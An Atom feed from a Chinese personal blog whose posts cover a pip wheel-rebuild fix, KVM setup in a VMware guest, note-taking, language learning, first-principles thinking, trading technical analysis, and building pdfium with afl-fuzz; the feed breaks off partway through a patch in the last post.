<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>安全代码</title>
  
  
  <link href="http://usmacd.com/atom.xml" rel="self"/>
  
  <link href="http://usmacd.com/"/>
  <updated>2024-01-17T16:00:00.000Z</updated>
  <id>http://usmacd.com/</id>
  
  <author>
    <name>henices</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python3 pip loading egg is deprecated 警告的解决方法</title>
    <link href="http://usmacd.com/cn/egg-is-deprecated/"/>
    <id>http://usmacd.com/cn/egg-is-deprecated/</id>
    <published>2024-01-16T16:00:00.000Z</published>
    <updated>2024-01-17T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>python3 -m pip install some_package 时发现 exploitable 有警告：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DEPRECATION: Loading egg at exploitable-1.32-py3.12.egg is deprecated. pip 24.3 will enforce this behaviour change. A possible replacement is</span><br><span class="line"> to use pip for package installation.. Discussion can be found at https://github.com/pypa/pip/issues/12330</span><br></pre></td></tr></table></figure><p>pip 24.3 将废弃 egg 形式的 python package, 根据 github issue [1] 的信息 pip 24.3 将在 October 2024 发布。可以使用下面的方法，要去掉上面的警告信息。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cd</span> exploitable_src_dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除老的 build 结果</span></span><br><span class="line"><span class="built_in">rm</span> -rf build dist htmlcov *.egg-info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级 pip</span></span><br><span class="line">python3 -m pip install --upgrade build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新 build</span></span><br><span class="line">python3 -m build --wheel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 wheel 的方式安装</span></span><br><span class="line">python3 -m pip install . --user</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考信息"><a href="#参考信息" class="headerlink" title="参考信息"></a>参考信息</h2><p>[1] <a href="https://github.com/pypa/pip/issues/12330">Remove support for installed .egg distributions</a><br>[2] <a href="https://packaging.python.org/en/latest/tutorials/packaging-projects/#uploading-your-project-to-pypi">Packaging Python Projects</a><br>[3] <a href="https://docs.python.org/3.11/distutils/setupscript.html">Writing the Setup Script</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;python3 -m pip install some_package 时发现 exploitable 有警告：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
      
    
    
    
    
    <category term="Programming" scheme="http://usmacd.com/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>公开写作的好处和坚持不懈</title>
    <link href="http://usmacd.com/cn/public_writing/"/>
    <id>http://usmacd.com/cn/public_writing/</id>
    <published>2023-12-04T16:00:00.000Z</published>
    <updated>2023-12-04T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="公开写作的好处"><a href="#公开写作的好处" class="headerlink" title="公开写作的好处"></a>公开写作的好处</h2><p>只有将想法写出来的时候，你才会发现似乎严密的论证中的逻辑漏洞和无知之处，不动笔的思考往往马虎。</p><ul><li>写下你学习的东西，可以加深你对该主题的理解，有时候向别人解释时你会发现自己的知识缺口。写作不仅是一个记录的方法，它是一个加深理解和暴露知识差距的强大工具。</li><li>写作使我们更加彻底地探索主题，并以更加连贯和准确的方式清晰地表达自己的想法。</li></ul><h2 id="坚持不懈（Consistency）的重要性"><a href="#坚持不懈（Consistency）的重要性" class="headerlink" title="坚持不懈（Consistency）的重要性"></a>坚持不懈（Consistency）的重要性</h2><p>虽然动机可能会点燃写作或任何其他创造性活动的兴趣火花，但真正点燃成功之火的是持续性。</p><ul><li>构建习惯：坚持不懈有利于习惯的建立。习惯一旦建立，将形成自动的行为，需要更少的努力保持行为模式，同时更加自然并享受其中的过程</li><li>逐步提高：持续练习可以带来逐步的提高，每次练习可能获得一个很小的进步，但拉长时间看，微小的进步会积累成显著的进步</li><li>保持动力：坚持不懈有助于保持动力。定期参加练习可以不断获得灵感，并形成肌肉记忆，显著减小开始练习时的阻力。</li><li>达到长期目标：成功通常是长期持续努力的结果。坚持不懈将日常行动和长期目标结合起来，创建一条通往成功之路。</li></ul><h2 id="坚持不懈的挑战"><a href="#坚持不懈的挑战" class="headerlink" title="坚持不懈的挑战"></a>坚持不懈的挑战</h2><ul><li>克服拖延症：拖延是坚持不懈最大的障碍，制定一个有规律的时间计划表，创造一个有利的环境，都有助于克服拖延这一挑战</li><li>处理倦怠：坚持不懈并不是不休息，平衡的生活是防止倦怠的关键，休息和充电与奋力向前同样重要</li><li>管理预期：并不是每一次练习都可以获得丰硕的成果，拥抱不完美，不要太过关注直接的成果，这样才能和坚持不懈的努力建立健康的关系。</li></ul><h2 id="保持坚持不懈的策略"><a href="#保持坚持不懈的策略" class="headerlink" title="保持坚持不懈的策略"></a>保持坚持不懈的策略</h2><ul><li>设定现实的目标： 将长期目标分解成较小的、可实现的阶段性目标，注重取得的进步而非过程完美</li><li>创建例程：创建固定的例程，创建保持坚持不懈的日常安排</li><li>寻求责任感：和朋友分享你的目标或者加入群组，从别人那里获得鼓励和责任感</li><li>庆祝进步：认可并庆祝取得的进步，哪怕是微小的进步，也能产生积极的正反馈，激发继续前进的动力</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://addyosmani.com/blog/write-learn/">https://addyosmani.com/blog/write-learn/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;公开写作的好处&quot;&gt;&lt;a href=&quot;#公开写作的好处&quot; class=&quot;headerlink&quot; title=&quot;公开写作的好处&quot;&gt;&lt;/a&gt;公开写作的好处&lt;/h2&gt;&lt;p&gt;只有将想法写出来的时候，你才会发现似乎严密的论证中的逻辑漏洞和无知之处，不动笔的思考往往马虎。&lt;/p</summary>
      
    
    
    
    
    <category term="KNOWLEDGE" scheme="http://usmacd.com/tags/KNOWLEDGE/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块</title>
    <link href="http://usmacd.com/cn/qemu_kvm/"/>
    <id>http://usmacd.com/cn/qemu_kvm/</id>
    <published>2023-11-27T16:00:00.000Z</published>
    <updated>2023-11-30T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里在 VMware Workstation Guset OS 里使用 qemu 的用法，有点像俄罗斯套娃。</p><p>qemu.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 2G \</span><br><span class="line">  -smp 2 \</span><br><span class="line">  -kernel <span class="variable">$KERNEL</span>/arch/x86——64/boot/bzImage \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">  -drive file=<span class="variable">$IMAGE</span>/bullseye.img,format=raw \</span><br><span class="line">  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">  -net nic,model=e1000 \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -nographic \</span><br><span class="line">  -pidfile vm.pid \</span><br><span class="line">  2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br></pre></td></tr></table></figure><p>执行命令后 <code>bash ./qemu.sh</code> 后报错</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory. </span><br><span class="line">qemu-system-x86_64: failed to initialize KVM: No such file or directory</span><br></pre></td></tr></table></figure><h2 id="解决-failed-to-initialize-KVM-错误"><a href="#解决-failed-to-initialize-KVM-错误" class="headerlink" title="解决 failed to initialize KVM 错误"></a>解决 failed to initialize KVM 错误</h2><p><code>lsmod | grep -i kvm</code> 发现没有加载 kvm 内核模块</p><p>使用 kvm-ok 检查具体情况。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/kvm-ok</span><br><span class="line"></span><br><span class="line">INFO: Your CPU does not support KVM extension</span><br><span class="line">KVM acceleration can NOT be used</span><br></pre></td></tr></table></figure><p>首先检查 VMware Workstation 的设置，发现处理器没有勾选虚拟化相关的设置。</p><ul><li>关机，调整 VMware 设置，设置 -&gt; 硬件 -&gt; 处理器 -&gt; 虚拟化引擎 -&gt; 选择 虚拟化 Intel VT-x &#x2F; EPT 或 AMD-V &#x2F; RVI</li></ul><p>重新打开 Ubuntu Guest 虚拟机报错 <code>此平台不支持虚拟化的Intel VT-x/EPT</code></p><h2 id="解决此平台不支持虚拟化的Intel-VT-x-EPT"><a href="#解决此平台不支持虚拟化的Intel-VT-x-EPT" class="headerlink" title="解决此平台不支持虚拟化的Intel VT-x&#x2F;EPT"></a>解决此平台不支持虚拟化的Intel VT-x&#x2F;EPT</h2><p>首先检查 BIOS 的设置是否正确，任务右键打开任务管理器 -&gt; 性能 -&gt; CPU 右下角，虚拟化：已启用，说明 BIOS 设置没有问题。</p><p>网络上的资料说需要禁用 Hyper-V，使用命令行的方法比较方便。</p><ul><li>以管理员权限打开 CMD 执行命令 <code>bcdedit /set hypervisorlaunchtype off</code> 关闭 hypervisorlaunchtype，重启系统</li></ul><p>重新执行 <code>/usr/sbin/kvm-ok</code> 显示一切正常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INFO: /dev/kvm exists</span><br><span class="line">KVM acceleration can be used</span><br></pre></td></tr></table></figure><p><code>egrep &quot;vmx|svm&quot; /proc/cpuinfo</code> 匹配 vmx，<code>lsmod | grep -i kvm</code> 显示加载了 <code>kvm_intel</code> 和 <code>kvm</code> 内核模块。</p><p>重新验证 Ubuntu Guest 里 qemu 是否正常工作，执行执行 qemu.sh，报错 <code>Could not access KVM kernel module: Permission denied</code></p><h2 id="解决-failed-to-initialize-KVM-Permission-denied"><a href="#解决-failed-to-initialize-KVM-Permission-denied" class="headerlink" title="解决 failed to initialize KVM: Permission denied"></a>解决 failed to initialize KVM: Permission denied</h2><p>看上去是权限问题，将当前用户添加在 kvm 组，<code>sudo usermod -a -G kvm &quot;test&quot;</code>，重启系统，执行 <code>bash ./qemu.sh</code> 成功启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">early console in setup code</span><br><span class="line">early console in extract_kerne</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此文档可能有不完备之处，后续会继续更新此文档。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.xda-developers.com/disable-hyper-v-windows-11/">https://www.xda-developers.com/disable-hyper-v-windows-11/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里在 VMware Workstation Guset OS 里使用 qemu 的用法，有点像俄罗斯套娃。&lt;/p&gt;
&lt;p&gt;qemu.sh&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>comprehensible input  英语学习方法</title>
    <link href="http://usmacd.com/cn/learning_english/"/>
    <id>http://usmacd.com/cn/learning_english/</id>
    <published>2023-11-22T16:00:00.000Z</published>
    <updated>2023-11-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>youtube 上有 youtuber 在不出国的情况下，将第二外语学习到母语者水平的成功案例。</p><p>Makoto 是一位会说中日英三门语言的 Youtuber，他总结自己学习第二外语的成功经验，可以简单地归纳成一句话：掌握第二外语最重要的是必须有大量地道的 comprehensible input (可理解的输入)。</p><p>Comprehensible input 是 Stephen D. Krashen 提出的语言习得假说，强调语言学习是获得的，而不是通过学习得到的。听力或者阅读获取的内容都可以是有效的输入，获取内容的语言难度必须略高于学习者的水平。</p><p>多大的地道语言输入量才是合适的 ？Makoto 推荐的时长为 1 个小时，30 分钟后休息 5 分钟，然后再继续下一个 30 分钟的学习。</p><p>Youtuber Makoto comprehensible input 英语学习具体步骤：<br>1）使用传统的学习方法，掌握 2000 个单词<br>2）在 youtube 上看视频，打开字幕边看边听，接受一些搞不懂的内容 (如果大量单词不认识就放弃)<br>3）在 youtube 上看视频，如果难度不够 (能听懂 80%以上)，就提高难度<br>4）将口语练习放到最后的步骤，只有输入够了，才能说出地道的外语</p><p>从理解内容到流利地说还有一段距离，Makoto 使用的方法是付费真人聊天，算是比较常规的方法。详细内容可以参考原视频。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;youtube 上有 youtuber 在不出国的情况下，将第二外语学习到母语者水平的成功案例。&lt;/p&gt;
&lt;p&gt;Makoto 是一位会说中日英三门语言的 Youtuber，他总结自己学习第二外语的成功经验，可以简单地归纳成一句话：掌握第二外语最重要的是必须有大量地道的 co</summary>
      
    
    
    
    
    <category term="KNOWLEDGE" scheme="http://usmacd.com/tags/KNOWLEDGE/"/>
    
  </entry>
  
  <entry>
    <title>定期回顾笔记的好处</title>
    <link href="http://usmacd.com/cn/note_review/"/>
    <id>http://usmacd.com/cn/note_review/</id>
    <published>2023-11-14T16:00:00.000Z</published>
    <updated>2023-11-14T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>少楠在 《笔记的方法》中介绍了一种 「通过回顾持续刺激」的笔记技术，我以前曾简称为「漫游笔记」技术。</p><p>定期回顾自己的笔记大体有下面几个好处：</p><ul><li>对抗遗忘曲线：尤其是文献笔记等自己不熟悉的笔记</li><li>推动知识内化，想法迭代：知识结构优化，新旧知识连接</li><li>遇见过去的自己 （挺好玩，挺有趣）</li><li>影响现实：促进自我审视，提供思路和线索</li></ul><p>对抗遗忘曲线：我们可能遗忘笔记的内容，尤其是文献笔记等不熟悉的内容。人的思维、行为、习惯具有惯性，观念、思维、方法并不容易改变，必须不断提醒自己。</p><p>知识内化：前提是笔记的上下文没有丢失，如果看不懂笔记了，笔记就失去了价值。所以，这里有一个关键点，笔记是写给未来的自己看的，应该假设未来的自己对文本背后的思想，原文背景一无所知，只具备相关的领域知识。</p><p>子曰：「温故而知新，可以为师矣」回顾笔记提供了再次学习的机会，不断加深对知识的理解，也能促进新的洞见的产生。</p><p>想法迭代：回顾笔记是用新视角去审视旧想法，总体来说人是会不断进步的，经过一段时间后再去重温自己某个时刻的想法，可能以前的一些疑惑现在已经没有了，也可能对某个问题有了更进一步的思路，这是促使想法迭代的一种方法。</p><p>影响现实：如果你长期关注特定的领域，以前的笔记可能给你现在做的事提供思路和线索，幸运的话，能迸发出新的灵感。</p><p>回顾笔记提供了过去和现在连接的机会。现在是否具备实践的机会？笔记中的思路、方法、知识都已经成功应用了吗？计划是否如期完成？错误是否已经纠正？坦诚地面对过去的自己，回到现实，可能你将迎来崭新的自己。</p><p>参考：<a href="https://www.usmacd.com/cn/note/">https://www.usmacd.com/cn/note/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;少楠在 《笔记的方法》中介绍了一种 「通过回顾持续刺激」的笔记技术，我以前曾简称为「漫游笔记」技术。&lt;/p&gt;
&lt;p&gt;定期回顾自己的笔记大体有下面几个好处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对抗遗忘曲线：尤其是文献笔记等自己不熟悉的笔记&lt;/li&gt;
&lt;li&gt;推动知识内化，想法迭代：知</summary>
      
    
    
    
    
    <category term="PKM" scheme="http://usmacd.com/tags/PKM/"/>
    
  </entry>
  
  <entry>
    <title>万维钢谈第一性原理</title>
    <link href="http://usmacd.com/cn/diyixingyuanli/"/>
    <id>http://usmacd.com/cn/diyixingyuanli/</id>
    <published>2023-11-13T16:00:00.000Z</published>
    <updated>2023-11-13T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>伊隆·马斯克解释 第一性原理，我们思考老问题，不一定需要使用类比思维考虑前人的做法，直接从最基本的原理出发，可能会找到全新的办法。创业者说第一性原理，精神的主旨为「抛开成见，拒绝套路」，回到最基本的限制条件，重新认识和解决问题。</p><p>马斯克使用第一性原理计算电池价值的例子，可能不太正确。电池的根本价值，重要的不是组成它的材料，而是材料的结合方式 - 凝结在它身上的信息。电池身上的信息，是技术和专利，这是几代人智慧的结晶。</p><p>从物理学上说，所谓第一性原理，是最基本的物理定律。数学学科的所有内容都是建立在第一性原理上的，从几条公理出发，推导出各种定律，所以数学是百分之百正确的学科。</p><p>从第一性原理出发做计算，有时候问题太复杂了，科学家不能使用第一性原理时，通常有两个解法方法：<br>1）把问题简化，做一些基本假设，忽略一些「次要」条件，这些假设构成一个模型，基于模型的计算，结果可能错误<br>2）淡化计算，借助历史经验（实验），比如化学和材料科学，大量的知识是实验积累的结果，不是谁从基本物理定律算出来</p><p>模型和经验既然不是从第一性原理出发的，就有可能是错的，就有被改进的余地，将来就有可能被取代。而取代它们的，往往是更好的……模型和经验。</p><p>马斯克的精神是对的，我们不应被前人的经验束缚，应该改革和创新。但是我们需要知道，什么情况下忽略前人的经验才是理性的行为。<br>1）有了新的工具：比如有新的工具让你对事物有了全新的理解或更深的理解<br>2）环境变了：比如今天的基础设施、原材料价格、消费者状况和以前有重大差别，老一套的方法不使用了，你就需要一个全新的商业模式</p><p>万维钢：作为一个前物理学家，我对第一性原理的第一反应是最基本的物理定律，所以谁跟我说要从第一性原理出发、重新建立一套新东西，我深表怀疑 —— 因为我尊重人类文明。</p><p>SpaceX 为什么可以使用第一性原理</p><ol><li>航天不是一个竞争充分有效的市场：航天基本是 NASA 垄断的领域，NASA 自己基本上只负责设计和科学研究，它会把火箭的制造工程转包给各个小公司</li><li>NASA 现在不怎么创新：NASA 在科学探索方面没问题，一直在进步，但它就像其他大型企业一样，得了大企业病。流程会让公司一直按照惯性行事</li></ol><p>《像火箭科学家一样思考》书中，瓦罗尔分析了 SpaceX 使用第一性原理的 6 个办法</p><ul><li>尽量不外包，80%的零部件自己生产</li><li>采购的方式更加灵活：可能到 ebay，废品厂去买二手零部件</li><li>和大市场对接：利用民用的产业链做火箭 (可能是最重要的一点)</li><li>回收，尽量重复使用火箭</li><li>用人不只用航天人才，也到大市场找人：从汽车、手机等快速迭代的领域寻找人才</li><li>“奥姆卡剃刀”，尽量简化制造流程</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;伊隆·马斯克解释 第一性原理，我们思考老问题，不一定需要使用类比思维考虑前人的做法，直接从最基本的原理出发，可能会找到全新的办法。创业者说第一性原理，精神的主旨为「抛开成见，拒绝套路」，回到最基本的限制条件，重新认识和解决问题。&lt;/p&gt;
&lt;p&gt;马斯克使用第一性原理计算电池价</summary>
      
    
    
    
    
    <category term="KNOWLEDGE" scheme="http://usmacd.com/tags/KNOWLEDGE/"/>
    
  </entry>
  
  <entry>
    <title>个人对技术分析的一些理解</title>
    <link href="http://usmacd.com/cn/jishufenxi/"/>
    <id>http://usmacd.com/cn/jishufenxi/</id>
    <published>2023-11-13T16:00:00.000Z</published>
    <updated>2023-11-13T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>技术分析分三个层次：趋势跟随、支撑&#x2F;阻力，模式识别  (分先后顺序，靠前的重要)。</p></li><li><p>金融投资中的技术分析工具最主要的作用是区别出哪些标的不可以交易，所谓不可以交易就是从概率上讲胜算不理想。顺势交易的胜率要远远超过逆势交易，技术分析工具则可以帮我们识别出「正确的方向」。</p></li><li><p>传统技术分析多数利用模式识别或者统计学的方法来识别交易机会，这些方法没法从底层逻辑上进行剖析，只是在概率上有一定优势罢了，实战起来就是有时灵验有时不灵验了。</p></li><li><p>但技术分析并不是毫无价值，如果把市场看成是一个复杂系统，复杂系统的重要特征在不同层级涌现出分形自相似，从分形结构上分析基础就扎实了很多。</p></li><li><p>传统的波浪理论是对市场进行分形分析的一次尝试，但并没有分析出基本结构，出现了千人千浪的现象，无法精确的指导交易。</p></li><li><p>缠中说禅「李彪」大师的 「缠论」有了新的进展，笔、线段、中枢的说法令人耳目一新，可惜天妒英才，大师尚未全面阐述理论就离我们而去。</p></li><li><p>如果研究市场的时间长了，基本上都会涉及到 复杂系统，耗散结构理论，混沌理论 等方面的知识去。技术分析到后面，基本会涉及到是市场基本结构形态和动力学。</p></li><li><p>「不存在可以终结所有准则的准则」，技术分析工具是设计来解释市场现象的，但金融市场是一个复杂系统，我们难以对其行为进行建模，所以创造一个可以解释所有市场现象的模型在理论上就是行不通的。</p></li><li><p>技术分析工具只是尝试用一个模型来解释市场行为，它不具备预测市场走势的能力。因此只根据技术分析工具来进行交易是不可取的，我们需要使用更多维度的信息综合判断以提高我们的胜率。这些信息可能涉及基本面，行为经济学、经济学，政治等诸多方面的知识。</p></li><li><p>技术分析的模型在很多时候只是一种模糊的正确，只有市场的走势和模型解释一致时才代表解释可能正确。技术分析工具发出信号只代表市场行情的发展可能来到了一个关键点，这个关键点也是模糊的。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;技术分析分三个层次：趋势跟随、支撑&amp;#x2F;阻力，模式识别  (分先后顺序，靠前的重要)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;金融投资中的技术分析工具最主要的作用是区别出哪些标的不可以交易，所谓不可以交易就是从概率上讲胜算不理想。顺势交易的胜率要远远超过</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>使用 afl-fuzz fuzz pdfium</title>
    <link href="http://usmacd.com/cn/pdfium-fuzz.public/"/>
    <id>http://usmacd.com/cn/pdfium-fuzz.public/</id>
    <published>2023-11-06T05:52:04.969Z</published>
    <updated>2023-11-06T05:52:04.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>先在 <a href="https://pdfium.googlesource.com/pdfium/">https://pdfium.googlesource.com/pdfium/</a> 下载源码.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> repo</span><br><span class="line"><span class="built_in">cd</span> repo</span><br><span class="line">gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line"><span class="built_in">cd</span> pdfium</span><br></pre></td></tr></table></figure><p>gclient 命令在 depot_tools 中, 需要安装 参考下面的文章</p><p><a href="http://www.chromium.org/developers/how-tos/install-depot-tools">http://www.chromium.org/developers/how-tos/install-depot-tools</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure><p>主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。</p><p><code>https_proxy=http://localhost:8118 gclient sync</code> 下载 download google storage过<br>程中还会遇到一个网络问题，需要编写配置文件 ~&#x2F;.boto</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Boto]</span><br><span class="line">proxy = 127.0.0.1  # 不带 http://</span><br><span class="line">proxy_port= 8118</span><br></pre></td></tr></table></figure><p><code>export NO_AUTH_BOTO_CONFIG=~/.boto</code></p><p>源码包非常大，大概有1G多，需要耐心等待。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译需要使用 ubuntu 或者 Debian 系统，其他系统的依赖问题解决起来比较麻烦，<br>如果是上面两种操作系统的话，有脚本自动安装依赖。</p><p><code>./build/install-build-deps.sh</code></p><p>安装完所以依赖后就可以开始编译了，首先要先生成 gn 文件 (2016 年google 放弃使用原来的 gyp 编译方式)</p><p><code>gn args out/afl</code> 会调用vim 编译器， 输入下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Build arguments go here.</span><br><span class="line"># See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span><br><span class="line">use_goma = false # Googlers only. Make sure goma is installed and running first.</span><br><span class="line">is_debug = false  # Enable debugging features.</span><br><span class="line"></span><br><span class="line">pdf_use_skia = true # Set true to enable experimental skia backend.</span><br><span class="line">pdf_use_skia_paths = false  # Set true to enable experimental skia backend (paths only).</span><br><span class="line"></span><br><span class="line">pdf_enable_xfa = true  # Set false to remove XFA support (implies JS support).</span><br><span class="line">pdf_enable_v8 = true  # Set false to remove Javascript support.</span><br><span class="line">pdf_is_standalone = true  # Set for a non-embedded build.</span><br><span class="line">is_component_build = false # Disable component build (must be false)</span><br><span class="line">v8_static_library = true</span><br><span class="line"></span><br><span class="line">clang_use_chrome_plugins = false  # Currently must be false.</span><br><span class="line">use_sysroot = false  # Currently must be false on Linux, but entirely omitted on windows.</span><br><span class="line"></span><br><span class="line">use_afl = true</span><br><span class="line">#is_asan = true</span><br><span class="line">enable_nacl = true</span><br><span class="line">optimize_for_fuzzing = true</span><br><span class="line">symbol_level=1</span><br></pre></td></tr></table></figure><p>使用 ASAN 编译会报错，暂时不开启，接下来要解决 afl 的问题了， pdfium 的 third_party<br>中不包含 afl-fuzz 的源代码，需要到 chromium.googlesource.com 项目下载。<br>chromium 项目支持 libfuzzer 和 afl-fuzz，只要使用开关， <code>use_libfuzzer = true</code><br>或者 <code>use_afl = true</code> 即可打开。</p><p>要编译生成 pdfium_test, 必须指定 pdf_is_standalone &#x3D; true, pdfium 源码仓库中没有<br>afl-fuzz 的代码，需要自己下载。</p><p><a href="https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/">https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</a></p><p>可以直接下载 .tgz 文件<br><a href="https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz">https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz</a></p><p>下载后将源码 copy 到 ~&#x2F;repo&#x2F;pdfium&#x2F;third_party&#x2F;afl 中, 使用 <code>ninja -C out/afl</code> 编译整个项目。</p><p>使用 <code>is_debug=false</code> 可以明显提高fuzzing 速度，应该开启。另外一个比较有用的是<br><code>symbol_level</code>, 设置 symbol_level&#x3D;1 可以添加必要的调试符号，便于gdb调试。</p><p>在编译 skia backend 支持时，需要额外处理， 使用 C++14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use_cxx11 = false </span><br></pre></td></tr></table></figure><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><p>随着 chromium 代码的更新， afl 源码编译出现了一些小问题，需要处理。</p><p>src&#x2F;third_party&#x2F;afl&#x2F;patches&#x2F;0001-fix-build-with-std-c11.patch</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/afl-fuzz.c b/afl-fuzz.c</span></span><br><span class="line"><span class="comment">index 01b4afef0ecc..f0d564a33037 100644</span></span><br><span class="line"><span class="comment">--- a/afl-fuzz.c</span></span><br><span class="line"><span class="comment">+++ 